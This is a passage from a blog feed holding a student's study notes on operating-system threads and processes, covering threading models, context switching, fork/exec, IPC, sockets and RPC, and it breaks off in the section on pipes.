    <content type="html"><![CDATA[<h1 id="key-objectives"><a class="markdownIt-Anchor" href="#key-objectives"></a> Key objectives</h1><ul><li>Introduce the notion of a thread</li><li>Explicit threading - APIs for thread libraries</li><li>Implicit threading - kernel level thread management</li><li>Examine issues related to mutithreaded programming</li></ul><h1 id="thread-concept"><a class="markdownIt-Anchor" href="#thread-concept"></a> Thread Concept</h1><p>A thread is a basic unit of CPU utilization, in other word, a fundamental unit of CPU execution. It comprises of:</p><ul><li><strong>a thread ID, TID</strong></li><li><strong>a program counter</strong></li><li><strong>a register set</strong></li><li><strong>a stack</strong><br>And it shares with other threads belonging to the <em>same process</em>:</li><li><strong>code</strong> section</li><li><strong>data</strong> section</li><li><strong>operating-system resources</strong> + open files (and other memory management information) + signals (ps: signal handlers are in shared code section)<br>A thread can also be viewed as a flow of control. A traditional process has a single thread of control.</li></ul><p>Since each thread executes independently, each thread has its own understanding of the stack and of the registers.<br><img src="/2024/12/03/Operating-System-Concepts-Ch4/layout.png" alt="layout.png"><br>The bad part is that unlike the protection that exists among processes, the operating system can not prevent threads from interfering with each other – they share the same process space.</p><h2 id="motivation"><a class="markdownIt-Anchor" href="#motivation"></a> Motivation</h2><p>The first question merges in mind is that - why we need to introduce the concept of <strong>thread</strong>?</p><p>A process may have some independent parts of execution which can be executed asynchronically. Take Web browser as an example, it might have one thread displaying images or text (renderer) while another thread retrieves data from network (across NIC), these are relatively different work and need few communication, which can be seen as <em>independent</em>.</p><p>A process might have to handle some duplicate requests. Think about a Web server, it may perform several similar tasks, such as accepting client request for web pages, images or videos. If the web server program runs as a traditional single-threaded process, it can serve only one client at any point since concurrency is not true <em>parellelism</em>! One solution to the problem is to create a separate new process to serve every client. But that’s huge resource consumption because creating a new process is time-consuming and resource-intensive (and we terminate it when task finishes), and it’s in low resource utilization because the process just performs the same tasks as the original process (say, search data in DB and return it to client).</p><p>So in this cirsumstance, why not just create a more lightweight process - thread?<br><img src="/2024/12/03/Operating-System-Concepts-Ch4/server.png" alt="server.png"></p><h2 id="benefits"><a class="markdownIt-Anchor" href="#benefits"></a> Benefits</h2><ul><li><strong>Responsiveness:</strong> allowing program to continue running even if part of it is blocked or is performing a lengthy operation, thereby increasing reponsiveness to the user</li><li><strong>Resource sharing:</strong> sharing the memory and resources of the process to which they belong to, which allows an aplication to have several threads of activity within the same address space</li><li><strong>Economy:</strong> more economical to create and context-switch threads</li><li><strong>Scalability:</strong> threads can run in parellel on different processing cores, which takes advantage of muticores system</li></ul><h1 id="mechanism-of-thread-switching"><a class="markdownIt-Anchor" href="#mechanism-of-thread-switching"></a> Mechanism of Thread Switching</h1><p>Switching the CPU from one thread to another belonging to the same process involves suspending the current thread, saving its <em>state</em> (e.g., registers, accumulator), and then restoring the state of the thread being switched to.</p><p>The thread switch actually completes at the moment a new program counter is loaded into PC; at that point, the CPU is no longer executing the thread switching code, it is executing code associated with the new thread.</p><p>A context switch between threads does the following:</p><ol><li><strong>Save all registers</strong> (general-perpose, special and CCs) in TCB (Thread Control Block).</li><li>Then we will <strong>save PC</strong>. Instead of saving the current PC, we place the return address (found on the stack in the thread’s activation record) in the thread’s context block. When the thread is resumed later, the resuming address loaded into the PC will be the instruction immediately following the <code>call</code> instruction that invoked <code>Switch()</code> earlier.</li><li>Once the current thread’s state has been saved, <strong>load new values into the registers</strong> from the TCB of the next thread. We know that in the perspective of CPU, a context of a process or thread is all about the registers and condition codes (and maybe cache, but not consider here). So when a new stack pointer loaded onto SP, it actually performs “stack switching”.</li><li>So what is the exact point a context switch has taken place? That is, when the current PC is replaced by the saved PC found in the process table. Once the saved PC is loaded, <code>Switch()</code> is no longer executing; we are now executing instructions associated with the new thread, which should be the instruction immediately following the call to <code>Switch()</code>. <strong>As soon as the new PC is loaded, a context switch has taken place.</strong></li></ol><h1 id="multithreading-model"><a class="markdownIt-Anchor" href="#multithreading-model"></a> Multithreading Model</h1><h2 id="user-level-thread-and-kernel-level-thread"><a class="markdownIt-Anchor" href="#user-level-thread-and-kernel-level-thread"></a> User Level thread and Kernel Level thread</h2><p><strong>Support</strong> for threads may be provided eitherat the user level, for <strong>user threads</strong>, or by the kernel, for <strong>kernel threads</strong>. User threads are supported above the kernel and are managed without kernel support, whereas kernel threads are suported an managed directly by the operating system.</p><p>There are two confusing terms, one is “<em>support</em>” and the other is “<em>user/kernel thread</em>”.</p><p>To my understading, user level thread and kernel level thread are two abstract concepts. User threads are visible to user/programmer which means they can be manipulated by users. While kernel threads are visible to operating system, they are managed by kernel, and most importantly, they are the actual unit to be scheduled by kernel or to be executed by CPU.</p><p>So in order to make a user thread to be executed, a relationship must exist between user threads and kernel threads, that is <strong>mapping</strong>. The following are the three common ways to establish such a relationship.</p><h2 id="many-to-one-model"><a class="markdownIt-Anchor" href="#many-to-one-model"></a> Many-to-One Model</h2><p>The many-to-one model maps many user threads to a single kernel thread. Thread management (creation, termination, scheduling, etc) is implemented by <em>thread library</em>, so kernel is unaware of these threads and it can only “see” one user thread at any time.</p><p>This model is efficient since the management is all done in user level, without diving into kernel mode. However, if a thread calls a blocking system call (e.g. <code>sleep()</code>, <code>wait()</code> or I/O request), the entire process will block. Also, because only one thread can access the kernel at a time, it can’t make use of mutiple processors in muticores environment.<br><img src="/2024/12/03/Operating-System-Concepts-Ch4/many-to-one.png" alt="many-to-one.png"></p><h2 id="one-to-one-model"><a class="markdownIt-Anchor" href="#one-to-one-model"></a> One-to-One Model</h2><p>The one-to-one model maps each user thread to a kernel thread. It not only provides more concurrency by allowing another thread to run when a thread makes a blocking system call, but also allows mutiple threads to run in parallel in muticores environment.</p><p>The only drawback is that creating and manipulating a bunch of kernel threads bring a great overhead and can burden the performance of an application.<br><img src="/2024/12/03/Operating-System-Concepts-Ch4/one-to-one.png" alt="one-to-one.png"></p><h2 id="lightweight-process-lwp"><a class="markdownIt-Anchor" href="#lightweight-process-lwp"></a> Lightweight Process (LWP)</h2><p><em>Copy from <a href="https://cseweb.ucsd.edu">https://cseweb.ucsd.edu</a></em></p><p>Kernel threads are great for kernel writers and user threads answer many of the needs of users, but they are not perfect. Consider these examples:</p><ul><li>On a multiprocessor system, only one thread within a process can execute at a time</li><li>A process that consists of many threads, each of which may be able to execute at any time, will not get any more CPU time than a process containing only one thread</li><li>If any thread within a process makes a system call, all threads within that process will be blocked because of the context switch.</li><li>If any user thread blocks waiting for I/O or a resource, the entire process blocks. (Thread libraries usually replace blocking calls with non-blocking calls whenever possible to mitigate this.)</li></ul><p>To address these needs, we need to have a kernel supported user thread. That is to say, we need a facility for threads to share resources within a process, but we also need the ability of the kernel to preempt, schedule, and dispatch threads. This type of thread is called a <em>kernel supported user thread</em> or a <em>light-weight process (LWP)</em>. A light-weight process is in contrast with a <em>heavy-weight process</em> otherwise known as a process or task.</p><p>Our model of the universe has gone from looking like this:<br><img src="/2024/12/03/Operating-System-Concepts-Ch4/old.png" alt="old.png"><br>To looking like this:<br><img src="/2024/12/03/Operating-System-Concepts-Ch4/new.png" alt="new.png"></p><p>To the user-thread library, the LWP appears to be a virtual processor on which the application can schedule a user thread to run. Each LWP is attached to a kernel thread, and <strong>it is kernel threads that the operating system schedules to run on physical processors</strong> (Ch 5.).<br><img src="/2024/12/03/Operating-System-Concepts-Ch4/lwp.png" alt="lwp.png"></p><h2 id="many-to-many-model"><a class="markdownIt-Anchor" href="#many-to-many-model"></a> Many-to-Many Model</h2><p>Based on LWPs, the many-to-many model mutiplexes many user-level threads to a smaller or equal number of kernel threads. Developers can create as many user threads as necessary, and the corresponding kernel threads can run in parallel on a mutiprocessor.<br><img src="/2024/12/03/Operating-System-Concepts-Ch4/many-to-many.png" alt="many-to-many.png"></p><h1 id="user-level-and-kernel-level-multithreading"><a class="markdownIt-Anchor" href="#user-level-and-kernel-level-multithreading"></a> User-level and Kernel-level Multithreading</h1><p>The key difference between <strong>explicitly user-level thread libraries</strong> (e.g., <code>pthread</code> or <code>windows.h</code>) and <strong>implicitly kernel-level thread abstractions</strong> (e.g., thread pools, OpenMP, or GCD) lies in <strong>control granularity</strong> and <strong>abstraction level</strong>, which affects <strong>how threads are managed</strong> and <strong>who is responsible for managing them</strong>.</p><h3 id="1-user-level-thread-libraries-explicit-control"><a class="markdownIt-Anchor" href="#1-user-level-thread-libraries-explicit-control"></a> 1. User-Level Thread Libraries (Explicit Control)</h3><p>Examples: <code>pthread</code> (POSIX threads), <code>windows.h</code> (Windows threading API)</p><h4 id="characteristics"><a class="markdownIt-Anchor" href="#characteristics"></a> Characteristics:</h4><ul><li><strong>Explicit Thread Management:</strong><br>The programmer directly creates, manages, and synchronizes threads using APIs like <code>pthread_create</code>, <code>pthread_join</code>, or <code>CreateThread</code>.</li><li><strong>Fine-Grained Control:</strong><br>The library exposes lower-level primitives, allowing the programmer to:<ul><li>Decide when and how to create threads.</li><li>Explicitly synchronize threads with mutexes, condition variables, etc.</li><li>Handle thread termination and resource cleanup.</li></ul></li><li><strong>User-Space Scheduling:</strong><br>If implemented as purely user-level threads (like in the Many-to-One model), the kernel may not even be aware of these threads, and the thread library handles scheduling in user space. This provides lightweight thread management but can suffer from blocking issues.</li></ul><h3 id="2-kernel-level-thread-libraries-implicit-abstractions"><a class="markdownIt-Anchor" href="#2-kernel-level-thread-libraries-implicit-abstractions"></a> 2. Kernel-Level Thread Libraries (Implicit Abstractions)</h3><p>Examples: Thread pools, OpenMP (<code>omp.h</code>), Grand Central Dispatch (GCD)</p><h4 id="characteristics-2"><a class="markdownIt-Anchor" href="#characteristics-2"></a> Characteristics:</h4><ul><li><strong>Higher-Level Abstractions:</strong><br>These libraries or frameworks hide most of the low-level thread management details from the programmer. <u>Instead of directly managing threads, you typically submit <strong>task</strong> or use <strong>parallel constructs</strong>, and the system determines how threads are allocated</u>.</li><li><strong>Kernel-Managed Threads:</strong><br>These abstractions often rely on kernel threads for execution, meaning the kernel scheduler handles thread creation, termination, and context switching.</li><li><strong>Dynamic Resource Management:</strong><br>They dynamically adjust thread usage to match the available hardware resources (e.g., CPU cores) and workload. For example:<ul><li><strong>Thread pools</strong> reuse threads to minimize thread creation and destruction overhead.</li><li><strong>OpenMP</strong> dynamically distributes work across threads with constructs like <code>#pragma omp parallel for</code>.</li><li><strong>GCD</strong> (on Apple platforms) uses queues to schedule tasks onto kernel threads efficiently.</li></ul></li></ul><h3 id="why-they-seem-the-same-to-programmers"><a class="markdownIt-Anchor" href="#why-they-seem-the-same-to-programmers"></a> Why They “Seem the Same” to Programmers</h3><p>From a usability perspective, they may feel similar because:</p><ol><li>Both allow concurrent execution.</li><li>The higher-level abstractions are designed to make concurrency <strong>easier</strong>, hiding the underlying complexity.</li></ol><p>However, the <strong>level of abstraction</strong> and <strong>degree of control</strong> are vastly different. If you’re using <code>pthread</code>, you’re <strong>explicitly</strong> in charge of the threads, while with something like OpenMP or GCD, you’re simply defining tasks, and the <strong>framework/library manages everything else</strong>.</p><hr><p><strong>Reference:</strong></p><ul><li><a href="https://stackoverflow.com/questions/5440128/thread-context-switch-vs-process-context-switch">https://stackoverflow.com/questions/5440128/thread-context-switch-vs-process-context-switch</a></li><li><a href="https://users.cs.duke.edu/~narten/110/nachos/main/node13.html">https://users.cs.duke.edu/~narten/110/nachos/main/node13.html</a></li><li><a href="https://www.youtube.com/watch?v=M9HHWFp84f0">Why Are Threads Needed On Single Core Processors - Core Dumped</a></li><li><a href="https://stackoverflow.com/questions/15983872/difference-between-user-level-and-kernel-supported-threads">https://stackoverflow.com/questions/15983872/difference-between-user-level-and-kernel-supported-threads</a></li><li><a href="https://cseweb.ucsd.edu/classes/sp16/cse120-a/applications/ln/lecture4.html">https://cseweb.ucsd.edu/classes/sp16/cse120-a/applications/ln/lecture4.html</a></li><li>ChatGPT-4o</li><li><em>Operating System Concepts, 9th edition</em></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;key-objectives&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#key-objectives&quot;&gt;&lt;/a&gt; Key objectives&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Introduce the notion of a thre</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Operating System Concepts: Process Concept</title>
    <link href="http://example.com/2024/11/17/Operating-System-Concepts-Ch3/"/>
    <id>http://example.com/2024/11/17/Operating-System-Concepts-Ch3/</id>
    <published>2024-11-17T08:13:46.470Z</published>
    <updated>2025-04-12T08:51:37.785Z</updated>
    
    <content type="html"><![CDATA[<h1 id="key-objectives"><a class="markdownIt-Anchor" href="#key-objectives"></a> Key objectives</h1><ul><li>To learn the notion wof a process - a program in execution.</li><li>To describe the various features of processes, including scheduling, creation, and termination.</li><li>To introduce interprocess communication using shared memory and message passing.</li></ul><h1 id="process-concept"><a class="markdownIt-Anchor" href="#process-concept"></a> Process Concept</h1><h2 id="1-the-process"><a class="markdownIt-Anchor" href="#1-the-process"></a> 1. The process</h2><p>Informally, a process can be considered as a program in execution. While a program is a <em>passive</em> entity (often called an <strong>executable file</strong>), a process is an <em>active</em> entity with a PC spcifying the next instruction to execute and a set of associated resources.</p><p>So what do we mean by the term “resources”? We know that a process is more than the program code, which is known as the <strong>text section</strong>, it also includes the current activity and the contents of the processor’s registers. A process also includes the runtime process <strong>stack</strong>, which contains temporary data, and a <strong>data section</strong>, which contains global variables, and a heap, which is memory that is dynamically allocated during process run time. Following diagram shows the structure of a process in memory:<img src="/2024/11/17/Operating-System-Concepts-Ch3/memory_diagram.png" alt="memory_diagram.png"></p><hr><blockquote><p>补充：Linux 上查看进程地址空间</p></blockquote><ol><li>查看<code>/proc/&lt;PID&gt;/maps</code>文件</li></ol><ul><li>直接读取内核提供的虚拟文件，显示进程的完整内存布局（代码段、堆、栈、共享库等）。<img src="/2024/11/17/Operating-System-Concepts-Ch3/proc.png" alt="proc.png"></li></ul><ol start="2"><li>使用<code>pmap</code>命令<br><img src="/2024/11/17/Operating-System-Concepts-Ch3/pmap.png" alt="pmap.png"></li></ol><hr><h2 id="2-process-state"><a class="markdownIt-Anchor" href="#2-process-state"></a> 2. Process state</h2><p>A process may be in one of the states:</p><ul><li><strong>New</strong>: The process is being created.</li><li><strong>Running</strong>: Instructions are being executed.</li><li><strong>Waiting</strong>: The process is waiting for some event to occur (such as an I/O completion).</li><li><strong>Ready</strong>: The process is waiting to be assigned to a processor.</li><li><strong>Terminated</strong>: The process has finished execution.<br><img src="/2024/11/17/Operating-System-Concepts-Ch3/diagram-of-process-state.jpg" alt="diagram-of-process-state.jpg"></li></ul><h2 id="3-process-control-block"><a class="markdownIt-Anchor" href="#3-process-control-block"></a> 3. Process Control Block</h2><p>In the foregoing text we mentioned the structure of process in memory, which I think is the <strong>“memory’s view”</strong> of the process. Each process is represented in the operating system by a <strong>process conrol block (PCB)</strong>, which I think is essentially a “scheduler’s view” of the process.</p><p>PCB holds the metadata necessary for the OS to manage the process, containing many pieces of information:</p><ul><li><strong>Process state</strong></li><li><strong>Program counter</strong></li><li><strong>CPU registers</strong></li><li><strong>CPU-scheduling information</strong> (Ch 5.)</li><li><strong>Memory-management information</strong> (Ch 8.)</li><li><strong>Accounting information</strong>: including the amount of CPU and real time used, time limits, account number, process numbers, etc</li><li><strong>I/O status information</strong>: the list of I/O devices allocated to the process, a list of files, etc</li></ul><p>So, while the process structure in memory <strong>reflects the actual memory layout and runtime environment</strong> of the process, the PCB serves as the <strong>abstracted record that the OS scheduler uses</strong> to manage and control process execution.</p><p>Here is a more detailed introduction of PCB: <a href="https://www.geeksforgeeks.org/process-control-block-in-os/">https://www.geeksforgeeks.org/process-control-block-in-os/</a></p><h1 id="process-scheduling"><a class="markdownIt-Anchor" href="#process-scheduling"></a> Process Scheduling</h1><p>The objective of mutiprogramming is to have some process running at all times, to maximize CPU utilization. The objective of time sharing is to switch the CPU among processes to so frequently that users can interact with each program while it is running. To meet this objectives, the <strong>process scheduler</strong> selects an available process for program execution on the CPU.</p><h2 id="1-scheduling-queue"><a class="markdownIt-Anchor" href="#1-scheduling-queue"></a> 1. Scheduling queue</h2><p>Scheduling queue is the place where a process will be selected for execution. A common representation of process scheduling is a queueing diagram:<img src="/2024/11/17/Operating-System-Concepts-Ch3/queuing-diagram.png" alt="queuing-diagram.png"></p><h2 id="2-scheduler"><a class="markdownIt-Anchor" href="#2-scheduler"></a> 2. Scheduler</h2><p>The selection process we mentioned is carried out by the appropriate scheduler. Typically, there are two types of schedulers: <strong>long-term scheduler</strong> and <strong>short-term scheduler</strong>.</p><ul><li><strong>long-term scheduler (job scheduler)</strong>: selects processes from the pool and loads them into memory</li><li><strong>short-term scheduler (CPU scheduler)</strong>: selects from among the processes that are ready to execute and allocates the CPU to one of them</li></ul><p>It is important that the long-term scheduler select a god <em>process mix</em> of <strong>I/O-bound process</strong> and <strong>CPU-bound process</strong>, to make maximized utilization of CPU and other peripherals.</p><h1 id="operations-on-processes"><a class="markdownIt-Anchor" href="#operations-on-processes"></a> Operations on Processes</h1><h2 id="1-process-creation-forkexec"><a class="markdownIt-Anchor" href="#1-process-creation-forkexec"></a> 1. Process creation: <code>fork()</code>&amp;<code>exec()</code></h2><p>When a process creates a new process, it invokes <code>fork()</code> system call, then two processes will exist: the parent and the child. They each have their own independent memory space, <strong>created as a duplicate of the parent process’s memory image at the time of the <code>fork()</code>.</strong> So, while they initially share the same memory contents, they don’t share the same memory space—any changes in the memory of one process do not affect the other.</p><hr><blockquote><p>补充：为什么创建进程是设计为<code>fork()</code>的复制，而非 OS 直接 spawn 或 create ？</p></blockquote><p>1. <strong>历史与设计哲学</strong><br>Unix 的早期设计（1970 年代）强调  <strong>简单性</strong>  和  <strong>模块化</strong>，<code>fork()</code>  的机制完美契合了这一理念：</p><ul><li><strong>最小化内核功能</strong>：<code>fork()</code>  只需复制现有进程的地址空间，而不需要在内核中实现复杂的“启动新程序”逻辑。启动新程序的任务被分离到  <code>exec()</code>  函数中，两者组合使用（<code>fork()</code> + <code>exec()</code>）提供了极大的灵活性。</li><li><strong>复用现有逻辑</strong>：通过  <code>fork()</code>  复制父进程，子进程可以直接继承父进程的环境（如文件描述符、信号处理、权限等），无需重新配置，减少了重复代码。</li></ul><ol start="2"><li><strong>性能优化：写时复制（Copy-On-Write, COW）</strong><br>虽然  <code>fork()</code>  表面上是“复制整个进程”，但现代操作系统通过  <strong>写时复制</strong>  技术大幅优化了其性能：</li></ol><ul><li><p><strong>延迟物理内存复制</strong>：<code>fork()</code>  后，父子进程共享同一物理内存，直到某一方尝试修改内存页时，才会触发实际的复制。这避免了不必要的内存开销。</p></li><li><p><strong>高效且透明</strong>：COW 使得  <code>fork()</code>  的时间复杂度接近 O(1)，即使父进程占用大量内存，<code>fork()</code>  仍能快速完成。</p><p>3. <strong>灵活性与控制</strong><br><code>fork()</code> + <code>exec()</code>  的组合提供了精细的进程控制能力：</p></li><li><p><strong>父子进程共享初始化状态</strong>：子进程可以继承父进程的上下文（如打开的文件、信号处理函数、环境变量等），方便父子协作（例如管道通信）。</p></li><li><p><strong>中间步骤的定制</strong>：在  <code>fork()</code>  之后、<code>exec()</code>  之前，子进程可以修改自身环境（如重定向标准输入输出、调整权限、关闭不需要的文件描述符），而无需改动父进程或内核代码。</p><p>4. <strong>与  <code>spawn</code>  或  <code>create</code>  的对比</strong><br>直接提供  <code>spawn</code>  或  <code>create</code>  的接口（如 Windows 的  <code>CreateProcess</code>）看似更简洁，但存在以下权衡：</p></li><li><p><strong>灵活性受限</strong>：一步到位的  <code>spawn</code>  需要在接口中预设所有可能的参数（如环境变量、文件描述符继承规则等），导致接口复杂化。</p></li><li><p><strong>性能开销</strong>：每次创建进程都需重新初始化所有资源（如内存空间、文件描述符），而  <code>fork()</code>  通过 COW 和继承机制避免了重复初始化。</p></li><li><p><strong>与 Unix 工具链的兼容性</strong>：<code>fork()</code>  的设计与 Unix 的管道（<code>pipe</code>）、信号（<code>signal</code>）等机制深度集成，直接  <code>spawn</code>  可能破坏这种生态。</p></li></ul><hr><p>The <code>exec()</code> system call replaces the current process’s memory with a new program. When a process (either the parent or the child) calls <code>exec()</code>, it loads the specified binary executable into its own memory space, overwriting the existing program code, stack, heap, and data segments. This effectively “destroys” the memory image of the process that existed before the <code>exec()</code> call and replaces it with a new one.</p><p>This replacement doesn’t affect the other process, though:</p><ol><li><strong>Independent Memory Spaces:</strong> After <code>fork()</code>, the parent and child processes have separate memory spaces. So when the child (or the parent) calls <code>exec()</code>, it only affects that process’s memory, not the other’s.</li><li><strong>Process Continuation After <code>exec()</code>:</strong> After calling <code>exec()</code>, the process (now with a new memory image) continues execution at the entry point of the new program, rather than the program that was previously running. It can still execute because the <code>exec()</code> call replaces the memory but not the process ID (PID). The process itself persists, but its memory contents are now those of the new program.</li></ol><h2 id="2-process-termiation-waitexit"><a class="markdownIt-Anchor" href="#2-process-termiation-waitexit"></a> 2. Process termiation: <code>wait()</code>&amp;<code>exit()</code></h2><p>A process terminates when it finishes executing its final statement and asks the operating system to delete it by using the <code>exit()</code> system call. At hat point, the process may return a status value to its parent proess (via the <code>wait()</code> system call).</p><p>After the <code>exit()</code> sys call, all the resources of the process—including physical and virtual memory, open files, and I/O buffers—are deallocated by the operating system. However, it entry in the process table must remain there until the parent calls <code>wait()</code>, because the process table contains the process’s exit status.</p><h1 id="interprocess-communication"><a class="markdownIt-Anchor" href="#interprocess-communication"></a> Interprocess Communication</h1><p>Cooperating processes require an <strong>interprocess communicaton (IPC)</strong> mechanism that will allow them to exchange data and information with each other. There are two fundamental models of IPC: <strong>shared-memory</strong> and <strong>message-passing</strong>.</p><h2 id="1-shared-memory-model"><a class="markdownIt-Anchor" href="#1-shared-memory-model"></a> 1. Shared-memory model</h2><p>In this IPC Model, a shared memory region is established which is used by the processes for data communication. This memory region is <strong>present in the address space of the process which creates the shared memory segment</strong>. The processes that want to communicate with this process should <strong>attach this memory segment to their address space</strong>.</p><p>Here’s a basic outline of how shared memory IPC operates:</p><ul><li><strong>Creation of Shared Memory Segment:</strong> A process usually the parent, creates a shared memory segment using the system calls like <code>shmget()</code> in Unix-like systems. This segment is assigned the unique identifier (<code>shmid</code>).</li><li><strong>Attaching to the Shared Memory Segment:</strong> The Processes that need to access the shared memory attach themselves to this segment using <code>shmat()</code> system call. Once attached the processes can directly read from and write to the shared memory.</li><li><strong>Synchronization:</strong> Since multiple processes can access the shared memory simultaneously synchronization mechanisms like semaphores are often used to the <strong>prevent race conditions and ensure data consistency</strong>.</li><li><strong>Detaching and Deleting the Segment:</strong> When a process no longer needs access to the shared memory it can detach from the segment using <code>shmdt()</code> system call. The shared memory segment can be removed entirely from system using <code>shmctl()</code> once all processes have the detached.</li></ul><h2 id="2-message-passing-model"><a class="markdownIt-Anchor" href="#2-message-passing-model"></a> 2. Message-passing model</h2><p>Message passing provides a mechanism to allow processes to communicate and to synchronize their actions without sharing the same address space. A message-passing facility provides at least two operations: <code>send(message)</code>and<code>receive(message)</code>. To satisfy these purposes, a <em>logical communication link</em> is needed.</p><p>Although the message queue is not maintained by the processes but the kernel, synchronization problem still exists. There are two types of implements: <code>sychronous message passing (blocking)</code> and <code>asynchronous message passing (non-blocking)</code>.</p><table><thead><tr><th>Shared Memory Model</th><th>Message Passing Model</th></tr></thead><tbody><tr><td>The shared memory region is used for communication.</td><td>A message-passing facility is used for communication.</td></tr><tr><td>It is used for communication between processes on a single processor or multiprocessor system where the communicating processes reside on the same machine as the communicating processes share a common address space.</td><td>It is typically used in a distributed environment where communicating processes reside on remote machines connected through a network.</td></tr><tr><td>The code for reading and writing the data from the shared memory should be written explicitly by the Application programmer.</td><td>No such code is required here as the message-passing facility provides a mechanism for communication and synchronization of actions performed by the communicating processes.</td></tr><tr><td>It provides a maximum speed of computation as communication is done through shared memory so system calls are made only to establish the shared memory.</td><td>It is time-consuming as message passing is implemented through kernel intervention (system calls).</td></tr><tr><td>Here the processes need to ensure that they are not writing to the same location simultaneously.</td><td>It is useful for sharing small amounts of data as conflicts need not be resolved.</td></tr><tr><td>Faster communication strategy.</td><td>Relatively slower communication strategy.</td></tr><tr><td>No kernel intervention.</td><td>It involves kernel intervention.</td></tr><tr><td>It can be used in exchanging larger amounts of data.</td><td>It can be used in exchanging small amounts of data.</td></tr><tr><td>Example- <br><br>- Data from a client process may need to be transferred to a server process for modification before being returned to the client.</td><td>Example- <br><br>- Web browsers<br>- Web Servers<br>- Chat program on WWW (World Wide Web)</td></tr></tbody></table><h1 id="communication-in-client-server-system"><a class="markdownIt-Anchor" href="#communication-in-client-server-system"></a> Communication in Client-Server system</h1><h2 id="1-sockets"><a class="markdownIt-Anchor" href="#1-sockets"></a> 1. Sockets</h2><p>Sockets are designed to provide <strong>low-level communication mechanisms</strong>. They are (1) Closer to the network layer and (2) more flexible but require more work from the developer to interpret the data.</p><h3 id="whats-the-format-of-data-in-connection-between-sockets"><a class="markdownIt-Anchor" href="#whats-the-format-of-data-in-connection-between-sockets"></a> What’s the format of data in connection between sockets</h3><p>We define sockets with the term <strong>&quot;low-level &quot;</strong> because sockets provide a way to send and receive <strong>raw data</strong> (byte streams). It is up to the developer to define the meaning, structure, and interpretation of these bytes. Sockets do not impose any structure on the data; they only transport it as an <strong>unstructed stream of bytes</strong>. In this way, the application must define a protocol to add structure, such as delimiters, headers, or serialization formats.</p><h3 id="designing-purpose"><a class="markdownIt-Anchor" href="#designing-purpose"></a> Designing purpose</h3><p>The purposes of socket are to provide a general-purpose communication mechanism and to focus on <strong>how</strong> to transmit data rather than its <strong>meaning</strong>.</p><hr><p>Here’s an example. When transmitting a message like <code>&quot;Hello, World!&quot;</code> over a socket, it’s sent as a sequence of bytes:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">72 101 108 108 111 44 32 87 111 114 108 100 33</span><br></pre></td></tr></table></figure><p>The receiver must have prior knowledge of how to interpret these bytes:</p><ul><li>Are they plain text? Binary data? A serialized object?</li><li>Is there a delimiter to separate multiple messages?</li></ul><h2 id="2-remote-procedure-calls"><a class="markdownIt-Anchor" href="#2-remote-procedure-calls"></a> 2. Remote Procedure Calls</h2><h3 id="procedure-calls"><a class="markdownIt-Anchor" href="#procedure-calls"></a> Procedure calls</h3><p>A <strong>procedure call</strong> is a mechanism in programming where one piece of code (the caller) invokes a procedure or function defined elsewhere. During a procedure call:</p><ol><li>The caller temporarily suspends its execution.</li><li>Control transfers to the invoked procedure.</li><li>After the procedure finishes execution, control returns to the caller, optionally with a return value.</li></ol><p>That seems like a simple function call, which definitely satisfies synchronization and occurs in the same address space.</p><h3 id="rpc"><a class="markdownIt-Anchor" href="#rpc"></a> RPC</h3><p>RPC (Remote Procedure Call) systems are designed to make remote communication <strong>look and feel like a local function (procedure) call</strong>. To achieve this, they operate at a <strong>higher level of abstraction</strong> and handle the complexity of encoding/decoding data automatically.</p><p>Instead of directly send the raw data, the RPC framework serializes these parameters into a structured message format for transmission, and then convey them to sockets, that’s why we called them “higher level”.</p><h3 id="message-structure"><a class="markdownIt-Anchor" href="#message-structure"></a> Message Structure:</h3><ul><li>Messages are structured and follow a well-defined format (e.g., Protocol Buffers in gRPC, XML in XML-RPC, or JSON in JSON-RPC).</li><li>Each message includes metadata, method names, arguments, and return values.</li><li>This structure ensures that the receiver (server or client) knows how to decode and interpret the data.</li></ul><h3 id="designing-purpose-2"><a class="markdownIt-Anchor" href="#designing-purpose-2"></a> Designing purpose</h3><p>RPC not only simplifies distributed computing but also focus on <strong>what</strong> to transmit (parameters and return values), not <strong>how</strong> to transmit it.</p><h3 id="difference-and-relation-with-sockets"><a class="markdownIt-Anchor" href="#difference-and-relation-with-sockets"></a> Difference and relation with sockets:</h3><p>In essence, <strong>RPC builds on sockets</strong> to abstract away low-level details and provide a structured, user-friendly interface for developers.</p><ul><li><strong>Sockets</strong> provide a flexible, low-level mechanism for transmitting unstructured byte streams, leaving structure and interpretation to the application developer.</li><li><strong>RPC</strong> adds an abstraction layer, automatically structuring messages (parameters, metadata, etc.) to simplify distributed computing and make remote calls feel like local ones.</li></ul><hr><p>In an RPC call, a function like <code>getUserData(123)</code> could be serialized into a message:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;method&quot;</span><span class="punctuation">:</span> <span class="string">&quot;getUserData&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;params&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="number">123</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>The server processes this structured message and sends back a structured response:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;result&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">123</span><span class="punctuation">,</span> <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Alice&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;age&quot;</span><span class="punctuation">:</span> <span class="number">30</span> <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="3-pipes"><a class="markdownIt-Anchor" href="#3-pipes"></a> 3. Pipes</h2><p>A <strong>pipe</strong> acts as a conduit allowing two processes to communicate. In completing a pipe, four issues must be considered:</p><ol><li>Does the pope alow bidirectional communication or unidirectional?</li><li>If two-way 